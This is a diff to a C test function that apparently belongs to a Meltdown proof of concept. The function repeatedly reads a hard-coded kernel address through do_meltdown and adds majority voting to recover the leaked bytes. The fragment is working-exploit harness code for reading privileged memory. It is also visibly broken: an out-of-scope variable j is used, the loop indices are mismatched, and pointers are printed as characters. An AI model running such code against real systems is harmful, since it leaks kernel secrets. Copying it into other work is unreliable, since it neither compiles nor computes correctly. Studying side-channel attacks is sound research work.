@@ -160,18 +160,41 @@ void test_meltdown(){
 #define RANGE 300
 void test_init_uts_ns(){
     uintptr_t target = 0xffffffffb9df9920;
-    int buf[RANGE];
+    int *buf[RANGE];
     for (int i=0;i<RANGE;i++){
-        buf[i]=-1;
+        buf[i]=malloc((REPS+1)*sizeof(int));
     }    
     
     for (int i=0;i<REPS;i++){
         for (int j=0;j<RANGE;j++){
-            if (buf[j]==-1){
-                buf[j]=do_meltdown(target+2*j);
-            }
+            buf[j][i]=do_meltdown(target+2*j);
         }
     }
+    
+    int count[257];
+    int max, cand;
+    for (int i=0;i<RANGE;i++){
+        // reset count
+        for(int k=0;k<257;k++){
+            count[k]=0;
+        }
+        for (int j=0;j<RANGE;j++){
+            if (buf[j][i]!=-1) count[buf[j][i]]++;
+            else count[256]++;
+        }
+        
+        max=0;
+        for(int k=0;k<256;k++){
+            if (count[k]>max){
+                max=count[k];
+                cand = k;
+            }
+        }
+        buf[j][REPS]=cand;
+        printf("position %i %i with %i\n", i, cand, max);
+    }
+    
+    
     
     for (int i=0;i<RANGE;i++){
         printf("measured value %i = %c at position %i\n", buf[i],buf[i], i);
